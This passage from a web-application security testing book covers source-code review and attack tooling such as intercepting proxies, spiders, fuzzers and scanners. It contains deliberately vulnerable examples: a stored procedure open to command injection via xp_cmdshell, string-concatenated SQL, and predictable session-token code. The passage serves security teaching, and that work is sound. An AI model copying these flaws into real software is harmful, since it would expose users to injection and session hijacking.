if the application uses a low-privileged account to access the database, and 
stored procedures were created using a DBA account, a SQL injection fl aw 
within a procedure may enable you to escalate privileges and perform arbitrary database queries.
Calls to Dangerous Functions
Customized code components such as stored procedures are often used to perform unusual or powerful actions. If user-supplied data is passed to a potentially 
dangerous function in an unsafe way, this may lead to various kinds of vulnerabilities, depending on the nature of the function. For example, the following 
stored procedure is vulnerable to command injection in the @loadfile and 
@loaddir parameters:
Create import_data (@loadfile varchar(25), @loaddir varchar(25) )
as
begin
select @cmdstring = ‚Äú$PATH/firstload ‚Äú + @loadfile + ‚Äú ‚Äú + @loaddir
exec @ret = xp_cmdshell @cmdstring
...
...
End
The following functions may be potentially dangerous if invoked in an 
unsafe way:
n Powerful default stored procedures in MS-SQL and Sybase that allow 
execution of commands, registry access, and so on
n Functions that provide access to the fi lesystem
n User-defi ned functions that link to libraries outside the database
n Functions that result in network access, such as through OpenRowSet in 
MS-SQL or a database link in Oracle
c19.indd 742 c19.indd 742 8/19/2011 12:18:39 PM 8/19/2011 12:18:39 PM
Stuttard c19.indd V2 - 08/11/2011 Page 743
 Chapter 19 n Finding Vulnerabilities in Source Code 743
Tools for Code Browsing
The methodology we have described for performing a code review essentially 
involves reading the source code and searching for patterns indicating the 
capture of user input and the use of potentially dangerous APIs. To carry out 
a code review effectively, it is preferable to use an intelligent tool to browse the 
codebase. You need a tool that understands the code constructs in a particular 
language, provides contextual information about specifi c APIs and expressions, 
and facilitates your navigation.
In many languages, you can use one of the available development studios, 
such as Visual Studio, NetBeans, or Eclipse. In addition, various generic codebrowsing tools support numerous languages and are optimized for viewing 
of code rather than development. The authors‚Äô preferred tool is Source Insight, 
shown in Figure 19-1. It supports easy browsing of the source tree, a versatile 
search function, a preview pane to display contextual information about any 
selected expression, and speedy navigation through the codebase.
Figure 19-1: Source Insight being used to search and browse the source code for a 
web application
c19.indd 743 c19.indd 743 8/19/2011 12:18:39 PM 8/19/2011 12:18:39 PM
Stuttard c19.indd V2 - 08/11/2011 Page 744
744 Chapter 19 n Finding Vulnerabilities in Source Code 
Summary
Many people who have substantial experience with testing web applications 
interactively, exhibit an irrational fear of looking inside an application‚Äôs codebase 
to discover vulnerabilities directly. This fear is understandable for people who 
are not programmers, but it is rarely justifi ed. Anyone who is familiar with 
dealing with computers can, with a little investment, gain suffi cient knowledge 
and confi dence to perform an effective code audit. Your objective in reviewing an application‚Äôs codebase need not be to discover ‚Äúall‚Äù the vulnerabilities 
it contains, any more than you would set yourself this unrealistic goal when 
performing hands-on testing. More reasonably, you can aspire to understand 
some of the key processing that the application performs on user-supplied input 
and recognize some of the signatures that point toward potential problems. 
Approached in this way, code review can be an extremely useful complement 
to the more familiar black-box testing. It can improve the effectiveness of that 
testing and reveal defects that may be extremely diffi cult to discover when you 
are dealing with an application entirely from the outside.
Questions
Answers can be found at http://mdsec.net/wahh.
 1. List three categories of common vulnerabilities that often have easily 
recognizable signatures within source code.
 2. Why can identifying all sources of user input sometimes be challenging 
when reviewing a PHP application?
 3. Consider the following two methods of performing a SQL query that 
incorporates user-supplied input:
// method 1
String artist = request.getParameter(‚Äúartist‚Äù).replaceAll(‚Äú‚Äô‚Äù, ‚Äú‚Äô‚Äô‚Äù);
String genre = request.getParameter(‚Äúgenre‚Äù).replaceAll(‚Äú‚Äô‚Äù, ‚Äú‚Äô‚Äô‚Äù);
String album = request.getParameter(‚Äúalbum‚Äù).replaceAll(‚Äú‚Äô‚Äù, ‚Äú‚Äô‚Äô‚Äù);
Statement s = connection.createStatement();
s.executeQuery(‚ÄúSELECT * FROM music WHERE artist = ‚Äò‚Äù + artist +
 ‚Äò‚Äù AND genre = ‚Äò‚Äù + genre + ‚Äò‚Äù AND album = ‚Äò‚Äù + album + ‚Äú‚Äô‚Äù);
// method 2
String artist = request.getParameter(‚Äúartist‚Äù);
String genre = request.getParameter(‚Äúgenre‚Äù);
String album = request.getParameter(‚Äúalbum‚Äù);
Statement s = connection.prepareStatement(
 ‚ÄúSELECT * FROM music WHERE artist = ‚Äò‚Äù + artist +
 ‚Äú‚Äô AND genre = ? AND album = ?‚Äù);
c19.indd 744 c19.indd 744 8/19/2011 12:18:39 PM 8/19/2011 12:18:39 PM
Stuttard c19.indd V2 - 08/11/2011 Page 745
 Chapter 19 n Finding Vulnerabilities in Source Code 745
s.setString(1, genre);
s.setString(2, album);
s.executeQuery();
Which of these methods is more secure, and why?
 4. You are reviewing the codebase of a Java application. During initial reconnaissance, you search for all uses of the HttpServletRequest.getParameter
API. The following code catches your eye:
private void setWelcomeMessage(HttpServletRequest request) throws
 ServletException
{
 String name = request.getParameter(‚Äúname‚Äù);
 if (name == null)
 name = ‚Äú‚Äù;
 m_welcomeMessage = ‚ÄúWelcome ‚Äú + name +‚Äù!‚Äù;
}
What possible vulnerability might this code indicate? What further code 
analysis would you need to perform to confi rm whether the application 
is indeed vulnerable?
 5. You are reviewing the mechanism that an application uses to generate 
session tokens. The relevant code is as follows:
public class TokenGenerator
{
 private java.util.Random r = new java.util.Random();
 public synchronized long nextToken()
 {
 long l = r.nextInt();
 long m = r.nextInt();
 return l + (m << 32);
 }
}
Are the application‚Äôs session tokens being generated in a predictable way? 
Explain your answer fully.
c19.indd 745 c19.indd 745 8/19/2011 12:18:39 PM 8/19/2011 12:18:39 PM
Stuttard c19.indd V2 - 08/11/2011 Page 746
c19.indd 746 c19.indd 746 8/19/2011 12:18:39 PM 8/19/2011 12:18:39 PM
Stuttard c20.indd V3 - 08/16/2011 Page 747
747
 C H A P T E R 
20
A Web Application 
Hacker‚Äôs Toolkit
Some attacks on web applications can be performed using only a standard web 
browser; however, the majority of them require you to use some additional tools. 
Many of these tools operate in conjunction with the browser, either as extensions that modify the browser‚Äôs own functionality, or as external tools that run 
alongside the browser and modify its interaction with the target application.
The most important item in your toolkit falls into this latter category. It operates as an intercepting web proxy, enabling you to view and modify all the 
HTTP messages passing between your browser and the target application. Over 
the years, basic intercepting proxies have evolved into powerful integrated tool 
suites containing numerous other functions designed to help you attack web 
applications. This chapter examines how these tools work and describes how 
you can best use their functionality.
The second main category of tool is the standalone web application scanner. 
This product is designed to automate many of the tasks involved in attacking a 
web application, from initial mapping to probing for vulnerabilities. This chapter 
examines the inherent strengths and weaknesses of standalone web application 
scanners and briefl y looks at some current tools in this area.
Finally, numerous smaller tools are designed to perform specifi c tasks when 
testing web applications. Although you may use these tools only occasionally, 
they can prove extremely useful in particular situations.
c20.indd 747 c20.indd 747 8/19/2011 12:21:04 PM 8/19/2011 12:21:04 PM
Stuttard c20.indd V3 - 08/16/2011 Page 748
748 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 
Web Browsers
A web browser is not exactly a hack tool, as it is the standard means by which 
web applications are designed to be accessed. Nevertheless, your choice of 
web browser may have an impact on your effectiveness when attacking a web 
application. Furthermore, various extensions are available to different types of 
browsers, which can help you carry out an attack. This section briefl y examines three popular browsers and some of the extensions available for them.
Internet Explorer
Microsoft‚Äôs Internet Explorer (IE) has for many years been the most widely 
used web browser. It remains so by most estimates, capturing approximately 
45% of the market. Virtually all web applications are designed for and tested 
on current versions of IE. This makes IE a good choice for an attacker, because 
most applications‚Äô content and functionality are displayed correctly and can be 
used properly within IE. In particular, other browsers do not natively support 
ActiveX controls, making IE mandatory if an application employs this technology. One restriction imposed by IE is that you are restricted to working with 
the Microsoft Windows platform.
Because of IE‚Äôs widespread adoption, when you are testing for cross-site 
scripting and other attacks against application users, you should always try to 
make your attacks work against this browser if possible (see Chapter 12).
NOTE Internet Explorer 8 introduced an anti-XSS fi lter that is enabled by 
default. As described in Chapter 12, this fi lter attempts to block most standard 
XSS attacks from executing and therefore causes problems when you are testing XSS exploits against a target application. Normally you should disable the 
XSS fi lter while testing. Ideally, when you have confi rmed an XSS vulnerability, 
you should then reenable the fi lter and see whether you can fi nd a way to 
bypass the fi lter using the vulnerability you have found.
Various useful extensions are available to IE that may be of assistance when 
attacking web applications, including the following:
n HttpWatch, shown in Figure 20-1, analyzes all HTTP requests and responses, 
providing details of headers, cookies, URLs, request parameters, HTTP 
status codes, and redirects.
n IEWatch performs similar functions to HttpWatch. It also does some 
analysis of HTML documents, images, scripts, and the like.
c20.indd 748 c20.indd 748 8/19/2011 12:21:04 PM 8/19/2011 12:21:04 PM
Stuttard c20.indd V3 - 08/16/2011 Page 749
 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 749
Figure 20-1: HttpWatch analyzes the HTTP requests issued by Internet Explorer
Firefox
Firefox is currently the second most widely used web browser. By most estimates it makes up approximately 35% of the market. The majority of web 
applications work correctly on Firefox; however, it has no native support for 
ActiveX controls.
There are many subtle variations among different browsers‚Äô handling of 
HTML and JavaScript, particularly when they do not strictly comply with the 
standards. Often, you will fi nd that an application‚Äôs defenses against bugs 
such as cross-site scripting mean that your attacks are not effective against 
every browser platform. Firefox‚Äôs popularity is suffi cient that Firefox-specifi c 
XSS exploits are perfectly valid, so you should test these against Firefox if you 
encounter diffi culties getting them to work against IE. Also, features specifi c to 
Firefox have historically allowed a range of attacks to work that are not possible 
against IE, as described in Chapter 13.
c20.indd 749 c20.indd 749 8/19/2011 12:21:04 PM 8/19/2011 12:21:04 PM
Stuttard c20.indd V3 - 08/16/2011 Page 750
750 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 
A large number of browser extensions are available for Firefox that may be 
useful when attacking web applications, including the following:
n HttpWatch is also available for Firefox.
n FoxyProxy enables fl exible management of the browser‚Äôs proxy confi guration, allowing quick switching, setting of different proxies for different 
URLs, and so on.
n LiveHTTPHeaders lets you modify requests and responses and replay 
individual requests.
n PrefBar allows you to enable and disable cookies, allowing quick access 
control checks, as well as switching between different proxies, clearing 
the cache, and switching the browser‚Äôs user agent.
n Wappalyzer uncovers technologies in use on the current page, showing 
an icon for each one found in the URL bar.
n The Web Developer toolbar provides a variety of useful features. Among 
the most helpful are the ability to view all links on a page, alter HTML 
to make form fi elds writable, remove maximum lengths, unhide hidden 
form fi elds, and change a request method from GET to POST.
Chrome
Chrome is a relatively new arrival on the browser scene, but it has rapidly gained 
popularity, capturing approximately 15% of the market.
A number of browser extensions are available for Chrome that may be useful 
when attacking web applications, including the following:
n XSS Rays is an extension that tests for XSS vulnerabilities and allows 
DOM inspection.
n Cookie editor allows in-browser viewing and editing of cookies.
n Wappalyzer is also available for Chrome.
n The Web Developer Toolbar is also available for Chrome.
Chrome is likely to contain its fair share of quirky features that can be used 
when constructing exploits for XSS and other vulnerabilities. Because Chrome 
is a relative newcomer, these are likely to be a fruitful target for research in the 
coming years. 
c20.indd 750 c20.indd 750 8/19/2011 12:21:05 PM 8/19/2011 12:21:05 PM
Stuttard c20.indd V3 - 08/16/2011 Page 751
 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 751
Integrated Testing Suites
After the essential web browser, the most useful item in your toolkit when 
attacking a web application is an intercepting proxy. In the early days of web 
applications, the intercepting proxy was a standalone tool that provided minimal 
functionality. The venerable Achilles proxy simply displayed each request and 
response for editing. Although it was extremely basic, buggy, and a headache 
to use, Achilles was suffi cient to compromise many a web application in the 
hands of a skilled attacker.
Over the years, the humble intercepting proxy has evolved into a number 
of highly functional tool suites, each containing several interconnected tools 
designed to facilitate the common tasks involved in attacking a web application. 
Several testing suites are commonly used by web application security testers:
n Burp Suite
n WebScarab
n Paros
n Zed Attack Proxy
n Andiparos
n Fiddler
n CAT
n Charles
These toolkits differ widely in their capabilities, and some are newer and 
more experimental than others. In terms of pure functionality, Burp Suite is 
the most sophisticated, and currently it is the only toolkit that contains all the 
functionality described in the following sections. To some extent, which tools 
you use is a matter of personal preference. If you do not yet have a preference, 
we recommend that you download and use several of the suites in a real-world 
situation and establish which best meets your needs.
This section examines how the tools work and describes the common work 
fl ows involved in making the best use of them in your web application testing.
How the Tools Work
Each integrated testing suite contains several complementary tools that share 
information about the target application. Typically, the attacker engages with the 
c20.indd 751 c20.indd 751 8/19/2011 12:21:05 PM 8/19/2011 12:21:05 PM
Stuttard c20.indd V3 - 08/16/2011 Page 752
752 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 
application in the normal way via his browser. The tools monitor the resulting 
requests and responses, storing all relevant details about the target application 
and providing numerous useful functions. The typical suite contains the following core components:
n An intercepting proxy
n A web application spider
n A customizable web application fuzzer
n A vulnerability scanner
n A manual request tool
n Functions for analyzing session cookies and other tokens
n Various shared functions and utilities
Intercepting Proxies
The intercepting proxy lies at the heart of the tool suite and remains today the 
only essential component. To use an intercepting proxy, you must confi gure 
your browser to use as its proxy server a port on the local machine. The proxy 
tool is confi gured to listen on this port and receives all requests issued by the 
browser. Because the proxy has access to the two-way communications between 
the browser and the destination web server, it can stall each message for review 
and modifi cation by the user and perform other useful functions, as shown in 
Figure 20-2.
Configuring Your Browser
If you have never set up your browser to use a proxy server, this is easy to do on 
any browser. First, establish which local port your intercepting proxy uses by 
default to listen for connections (usually 8080). Then follow the steps required 
for your browser:
n In Internet Explorer, select Tools √ø Internet Options √ø Connections √ø
LAN settings. Ensure that the ‚ÄúAutomatically detect settings‚Äù and ‚ÄúUse 
automatic confi guration script‚Äù boxes are not checked. Ensure that the ‚ÄúUse 
a proxy server for your LAN‚Äù box is checked. In the Address fi eld, enter 
127.0.0.1, and in the Port fi eld, enter the port used by your proxy. Click 
the Advanced button, and ensure that the ‚ÄúUse the same proxy server for 
all protocols‚Äù box is checked. If the hostname of the application you are 
attacking matches any of the expressions in the ‚ÄúDo not use proxy server 
c20.indd 752 c20.indd 752 8/19/2011 12:21:05 PM 8/19/2011 12:21:05 PM
Stuttard c20.indd V3 - 08/16/2011 Page 753
 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 753
for addresses beginning with‚Äù box, remove these expressions. Click OK 
in all the dialogs to confi rm the new confi guration.
n In Firefox, select Tools √ø Options √ø Advanced √ø Network √ø Settings. 
Ensure that the Manual Proxy Confi guration option is selected. In the HTTP 
Proxy fi eld, enter 127.0.0.1, and in the adjacent Port fi eld, enter the port 
used by your proxy. Ensure that the ‚ÄúUse this proxy server for all protocols‚Äù box is checked. If the hostname of the application you are attacking 
matches any of the expressions in the ‚ÄúNo proxy for‚Äù box, remove these 
expressions. Click OK in all the dialogs to confi rm the new confi guration.
n Chrome uses the proxy settings from the native browser that ships with 
the operating system on which it is running. You can access these settings via Chrome by selecting Options √ø Under the Bonnet √ø Network 
√ø Change Proxy Settings.
Figure 20-2: Editing an HTTP request on-the-fly using an intercepting proxy
c20.indd 753 c20.indd 753 8/19/2011 12:21:05 PM 8/19/2011 12:21:05 PM
Stuttard c20.indd V3 - 08/16/2011 Page 754
754 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 
WORKING WITH NON-PROXY-AWARE CLIENTS
Occasionally, you may fi nd yourself testing applications that use a thick client that runs outside of the browser. Many of these clients do not offer any 
settings to confi gure an HTTP proxy; they simply attempt to connect directly 
to the web server hosting the application. This behavior prevents you from 
simply using an intercepting proxy to view and modify the application‚Äôs 
traffi c.
Fortunately, Burp Suite offers some features that let you continue working 
in this situation. To do so, you need to follow these steps:
 1. Modify your operating system hosts file to resolve the hostnames used by 
the application to your loopback address (127.0.0.1). For example:
127.0.0.1 www.wahh-app.com
 This causes the thick client‚Äôs requests to be redirected to your own 
computer.
 2. For each destination port used by the application (typically 80 and 443), 
configure a Burp Proxy listener on this port of your loopback interface, 
and set the listener to support invisible proxying. The invisible proxying 
feature means that the listener will accept the non-proxy-style requests 
sent by the thick client, which have been redirected to your loopback 
address.
 3. Invisible mode proxying supports both HTTP and HTTPS requests. To prevent fatal certificate errors with SSL, it may be necessary to configure your 
invisible proxy listener to present an SSL certificate with a specific hostname which matches what the thick client expects. The following section 
has details on how you can avoid certificate problems caused by intercepting proxies.
 4. For each hostname you have redirected using your hosts file, configure 
Burp to resolve the hostname to its original IP address. These settings 
can be found under Options √ø Connections √ø Hostname Resolution. 
They let you specify custom mappings of domain names to IP addresses 
to override your computer‚Äôs own DNS resolution. This causes the outgoing requests from Burp to be directed to the correct destination server. 
(Without this step, the requests would be redirected to your own computer in an infinite loop.)
c20.indd 754 c20.indd 754 8/19/2011 12:21:05 PM 8/19/2011 12:21:05 PM
Stuttard c20.indd V3 - 08/16/2011 Page 755
 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 755
WORKING WITH NON-PROXY-AWARE CLIENTS
 5. When operating in invisible mode, Burp Proxy identifies the destination host to which each request should be forwarded using the Host
header that appears in requests. If the thick client you are testing does 
not include a Host header in requests, Burp cannot forward requests correctly. If you are dealing with only one destination host, you can work 
around this problem by configuring the invisible proxy listener to redirect 
all its requests to the required destination host. If you are dealing with 
multiple destination hosts, you probably need to run multiple instances 
of Burp on multiple machines and use your hosts file to redirect traffic for 
each destination host to a different intercepting machine.
Intercepting Proxies and HTTPS
When dealing with unencrypted HTTP communications, an intercepting proxy 
functions in essentially the same way as a normal web proxy, as described in 
Chapter 3. The browser sends standard HTTP requests to the proxy, with the 
exception that the URL in the fi rst line of the request contains the full hostname 
of the destination web server. The proxy parses this hostname, resolves it to 
an IP address, converts the request to its standard nonproxy equivalent, and 
forwards it to the destination server. When that server responds, the proxy 
forwards the response back to the client browser.
For HTTPS communications, the browser fi rst makes a cleartext request to 
the proxy using the CONNECT method, specifying the hostname and port of the 
destination server. When a normal (nonintercepting) proxy is used, the proxy 
responds with an HTTP 200 status code and keeps the TCP connection open. 
From that point onward (for that connection) the proxy acts as a TCP-level relay 
to the destination server. The browser then performs an SSL handshake with 
the destination server, setting up a secure tunnel through which to pass HTTP 
messages. With an intercepting proxy, this process must work differently so 
that the proxy can gain access to the HTTP messages that the browser sends 
through the tunnel. As shown in Figure 20-3, after responding to the CONNECT
request with an HTTP 200 status code, the intercepting proxy does not act as 
a relay but instead performs the server‚Äôs end of the SSL handshake with the 
browser. It also acts as an SSL client and performs a second SSL handshake with 
the destination web server. Hence, two SSL tunnels are created, with the proxy 
acting as a middleman. This enables the proxy to decrypt each message received 
c20.indd 755 c20.indd 755 8/19/2011 12:21:05 PM 8/19/2011 12:21:05 PM
Stuttard c20.indd V3 - 08/16/2011 Page 756
756 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 
through either tunnel, gain access to its cleartext form, and then reencrypt it 
for transmission through the other tunnel.
Figure 20-3: An intercepting proxy lets you view and modify HTTPS communications
CONNECT wahh-app:433
200 Connection established
1101001000100
11010100000...
1001001101000
10001001001...
1100100110010
01010101110...
0010010100001
01111010100...
GET / HTTP/1.1
User-Agent: Mozilla/
4.0 (compatible; MSIE
7.0; Windows NT 5.1)
Host: wahh-app.com
...
HTTP/1.1 200 OK
Content-Type: text/
html
Content-Length:
24246
<html><head>...
SSL tunnel 1 SSL tunnel 2
Attacker Target Internet
Intercepting proxy
Of course, if any suitably positioned attacker could perform this trick without detection, SSL would be fairly pointless, because it would not protect the 
privacy and integrity of communications between the browser and server. For 
this reason, a key part of the SSL handshake involves using cryptographic 
certifi cates to authenticate the identity of either party. To perform the server‚Äôs 
end of the SSL handshake with the browser, the intercepting proxy must use 
its own SSL certifi cate, because it does not have access to the private key used 
by the destination server.
In this situation, to protect against attacks, browsers warn the user, allowing 
her to view the spurious certifi cate and decide whether to trust it. Figure 20-4 
shows the warning presented by IE. When an intercepting proxy is being used, 
both the browser and proxy are fully under the attacker‚Äôs control, so he can 
accept the spurious certifi cate and allow the proxy to create two SSL tunnels.
When you are using your browser to test an application that uses a single 
domain, handling the browser security warning and accepting the proxy‚Äôs 
c20.indd 756 c20.indd 756 8/19/2011 12:21:05 PM 8/19/2011 12:21:05 PM
Stuttard c20.indd V3 - 08/16/2011 Page 757
 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 757
homegrown certifi cate in this way normally is straightforward. However, in 
other situations you may still encounter problems. Many of today‚Äôs applications involve numerous cross-domain requests for images, script code, and 
other resources. When HTTPS is being used, each request to an external 
domain causes the browser to receive the proxy‚Äôs invalid SSL certifi cate. In 
this situation, browsers usually do not warn the user and thus do not give 
her the option to accept the invalid SSL certifi cate for each domain. Rather, 
they typically drop the cross-domain requests, either silently or with an alert 
stating that this has occurred.
Figure 20-4: Using an intercepting proxy with HTTPS communications generates a 
warning in the attacker‚Äôs browser
Another situation in which the proxy‚Äôs homegrown SSL certifi cates can cause 
problems is when you use a thick client running outside the browser. Normally, 
these clients simply fail to connect if an invalid SSL certifi cate is received and 
provide no way to accept the certifi cate.
Fortunately, there is a simple way to circumvent these problems. On installation, Burp Suite generates a unique CA certifi cate for the current user and 
stores this on the local machine. When Burp Proxy receives an HTTPS request 
to a new domain, it creates a new host certifi cate for this domain on-the-fl y and 
signs it using the CA certifi cate. This means that the user can install Burp‚Äôs CA 
certifi cate as a trusted root in her browser (or other trust store). All the resulting per-host certifi cates are accepted as valid, thereby removing all SSL errors 
caused by the proxy.
c20.indd 757 c20.indd 757 8/19/2011 12:21:06 PM 8/19/2011 12:21:06 PM
Stuttard c20.indd V3 - 08/16/2011 Page 758
758 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 
The precise method for installing the CA certifi cate depends on the browser 
and platform. Essentially it involves the following steps:
 1. Visit any HTTPS URL with your browser via the proxy.
 2. In the resulting browser warning, explore the certifi cate chain, and select 
the root certifi cate in the tree (called PortSwigger CA).
 3. Import this certifi cate into your browser as a trusted root or certifi cate 
authority. Depending on your browser, you may need to fi rst export the 
certifi cate and then import it in a separate operation.
Detailed instructions for installing Burp‚Äôs CA certifi cate on different browsers 
are contained in the online Burp Suite documentation at the following URL:
http://portswigger.net/burp/help/servercerts.html
Common Features of Intercepting Proxies
In addition to their core function of allowing interception and modifi cation of 
requests and responses, intercepting proxies typically contain a wealth of other 
features to help you attack web applications:
n Fine-grained interception rules, allowing messages to be intercepted for 
review or silently forwarded, based on criteria such as the target host, 
URL, method, resource type, response code, or appearance of specifi c 
expressions (see Figure 20-5). In a typical application, the vast majority of 
requests and responses are of little interest to you. This function allows you 
to confi gure the proxy to fl ag only the messages that you are interested in.
n A detailed history of all requests and responses, allowing previous messages 
to be reviewed and passed to other tools in the suite for further analysis 
(see Figure 20-6). You can fi lter and search the proxy history to quickly fi nd 
specifi c items, and you can annotate interesting items for future reference.
n Automated match-and-replace rules for dynamically modifying the contents of requests and responses. This function can be useful in numerous 
situations. Examples include rewriting the value of a cookie or other 
parameter in all requests, removing cache directives, and simulating a 
specifi c browser with the User-Agent header.
n Access to proxy functionality directly from within the browser, in addition 
to the client UI. You can browse the proxy history and reissue individual 
requests from the context of your browser, enabling the responses to be 
fully processed and interpreted in the normal way.
n Utilities for manipulating the format of HTTP messages, such as converting between different request methods and content encodings. These can 
sometimes be useful when fi ne-tuning an attack such as cross-site scripting.
c20.indd 758 c20.indd 758 8/19/2011 12:21:06 PM 8/19/2011 12:21:06 PM
Stuttard c20.indd V3 - 08/16/2011 Page 759
 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 759
n Functions to automatically modify certain HTML features on-the-fl y. You 
can unhide hidden form fi elds, remove input fi eld limits, and remove 
JavaScript form validation.
Figure 20-5: Burp proxy supports configuration of fine-grained rules for intercepting 
requests and responses
Figure 20-6: The proxy history, allowing you to view, filter, search, and annotate 
requests and responses made via the proxy
c20.indd 759 c20.indd 759 8/19/2011 12:21:06 PM 8/19/2011 12:21:06 PM
Stuttard c20.indd V3 - 08/16/2011 Page 760
760 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 
Web Application Spiders
Web application spiders work much like traditional web spiders. They request 
web pages, parse them for links to other pages, and then request those pages, 
continuing recursively until all of a site‚Äôs content has been discovered. To accommodate the differences between functional web applications and traditional 
websites, application spiders must go beyond this core function and address 
various other challenges:
n Forms-based navigation, using drop-down lists, text input, and other 
methods
n JavaScript-based navigation, such as dynamically generated menus
n Multistage functions requiring actions to be performed in a defi ned sequence
n Authentication and sessions
n The use of parameter-based identifi ers, rather than the URL, to specify 
different content and functionality
n The appearance of tokens and other volatile parameters within the URL 
query string, leading to problems identifying unique content
Several of these problems are addressed in integrated testing suites by sharing data between the intercepting proxy and spider components. This enables 
you to use the target application in the normal way, with all requests being processed by the proxy and passed to the spider for further analysis. Any unusual 
mechanisms for navigation, authentication, and session handling are thereby 
taken care of by your browser and your actions. This enables the spider to build 
a detailed picture of the application‚Äôs contents under your fi ne-grained control. 
This user-directed spidering technique is described in detail in Chapter 4. 
Having assembled as much information as possible, the spider can then be 
launched to investigate further under its own steam, potentially discovering 
additional content and functionality.
The following features are commonly implemented within web application 
spiders:
n Automatic update of the site map with URLs accessed via the intercepting proxy.
n Passive spidering of content processed by the proxy, by parsing it for 
links and adding these to the site map without actually requesting them 
(see Figure 20-7).
n Presentation of discovered content in table and tree form, with the facility 
to search these results.
n Fine-grained control over the scope of automated spidering. This enables 
you to specify which hostnames, IP addresses, directory paths, fi le types, 
c20.indd 760 c20.indd 760 8/19/2011 12:21:06 PM 8/19/2011 12:21:06 PM
Stuttard c20.indd V3 - 08/16/2011 Page 761
 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 761
and other items the spider should request to focus on a particular area of 
functionality. You should prevent the spider from following inappropriate 
links either within or outside of the target application‚Äôs infrastructure. This 
feature is also essential to avoid spidering powerful functionality such as 
administrative interfaces, which may cause dangerous side effects such 
as the deletion of user accounts. It is also useful to prevent the spider 
from requesting the logout function, thereby invalidating its own session.
n Automatic parsing of HTML forms, scripts, comments, and images, and 
analysis of these within the site map.
n Parsing of JavaScript content for URLs and resource names. Even if a full 
JavaScript engine is not implemented, this function often enables a spider 
to discover the targets of JavaScript-based navigation, because these usually appear in literal form within the script.
n Automatic and user-guided submission of forms with suitable parameters 
(see Figure 20-8).
n Detection of customized File Not Found responses. Many applications 
respond with an HTTP 200 message when an invalid resource is requested. 
If spiders are unable to recognize this, the resulting content map will 
contain false positives.
n Checking for the robots.txt fi le, which is intended to provide a blacklist 
of URLs that should not be spidered, but that an attacking spider can use 
to discover additional content.
n Automatic retrieval of the root of all enumerated directories. This can 
be useful to check for directory listings or default content (see 
Chapter 17).
n Automatic processing and use of cookies issued by the application to 
enable spidering to be performed in the context of an authenticated session.
n Automatic testing of session dependence of individual pages. This involves 
requesting each page both with and without any cookies that have been 
received. If the same content is retrieved, the page does not require a session or authentication. This can be useful when probing for some kinds 
of access control fl aws (see Chapter 8).
n Automatic use of the correct Referer header when issuing requests. Some 
applications may check the contents of this header, and this function ensures 
that the spider behaves as much as possible like an ordinary browser.
n Control of other HTTP headers used in automated spidering.
n Control over the speed and order of automated spider requests to 
avoid overwhelming the target and, if necessary, behave in a stealthy 
manner.
c20.indd 761 c20.indd 761 8/19/2011 12:21:07 PM 8/19/2011 12:21:07 PM
Stuttard c20.indd V3 - 08/16/2011 Page 762
762 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 
Figure 20-7: The results of passive application spidering, where items in gray have 
been identified passively but not yet requested
Figure 20-8: Burp Spider prompting for user guidance when 
submitting forms
Web Application Fuzzers
Although it is possible to perform a successful attack using only manual techniques, to become a truly accomplished web application hacker, you need to 
automate your attacks to enhance their speed and effectiveness. Chapter 14 
c20.indd 762 c20.indd 762 8/19/2011 12:21:07 PM 8/19/2011 12:21:07 PM
Stuttard c20.indd V3 - 08/16/2011 Page 763
 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 763
described in detail the different ways in which automation can be used in customized attacks. Most test suites include functions that leverage automation to 
facilitate various common tasks. Here are some commonly implemented features:
n Manually confi gured probing for common vulnerabilities. This function 
enables you to control precisely which attack strings are used and how they 
are incorporated into requests. Then you can review the results to identify 
any unusual or anomalous responses that merit further investigation.
n A set of built-in attack payloads and versatile functions to generate arbitrary payloads in user-defi ned ways ‚Äî for example, based on malformed 
encoding, character substitution, brute force, and data retrieved in a 
previous attack.
n The ability to save attack results and response data to use in reports or 
incorporate into further attacks.
n Customizable functions for viewing and analyzing responses ‚Äî for example, based on the appearance of specifi c expressions or the attack payload 
itself (see Figure 20-9).
n Functions for extracting useful data from the application‚Äôs responses ‚Äî for 
example, by parsing the username and password fi elds in a My Details 
page. This can be useful when you are exploiting various vulnerabilities, 
including fl aws in session-handling and access controls.
Figure 20-9: The results of a fuzzing exercise using Burp Intruder
c20.indd 763 c20.indd 763 8/19/2011 12:21:07 PM 8/19/2011 12:21:07 PM
Stuttard c20.indd V3 - 08/16/2011 Page 764
764 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 
Web Vulnerability Scanners
Some integrated testing suites include functions to scan for common web application vulnerabilities. The scanning that is performed falls into two categories:
n Passive scanning involves monitoring the requests and responses passing 
through the local proxy to identify vulnerabilities such as cleartext password 
submission, cookie misconfi guration, and cross-domain Referer leakage. 
You can perform this type of scanning noninvasively with any application that you visit with your browser. This feature is often useful when 
scoping out a penetration testing engagement. It gives you a feel for the 
application‚Äôs security posture in relation to these kinds of vulnerabilities.
n Active scanning involves sending new requests to the target application 
to probe for vulnerabilities such as cross-site scripting, HTTP header 
injection, and fi le path traversal. Like any other active testing, this type 
of scanning is potentially dangerous and should be carried out only with 
the consent of the application owner.
The vulnerability scanners included within testing suites are more userdriven than the standalone scanners discussed later in this chapter. Instead of 
just providing a start URL and leaving the scanner to crawl and test the application, the user can guide the scanner around the application, control precisely 
which requests are scanned, and receive real-time feedback about individual 
requests. Here are some typical ways to use the scanning function within an 
integrated testing suite:
n After manually mapping an application‚Äôs contents, you can select interesting areas of functionality within the site map and send these to be scanned. 
This lets you target your available time into scanning the most critical 
areas and receive the results from these areas more quickly.
n When manually testing individual requests, you can supplement your 
efforts by scanning each specifi c request as you are testing it. This gives 
you nearly instant feedback about common vulnerabilities for that request, 
which can guide and optimize your manual testing.
n You can use the automated spidering tool to crawl the entire application 
and then scan all the discovered content. This emulates the basic behavior 
of a standalone web scanner.
n In Burp Suite, you can enable live scanning as you browse. This lets you 
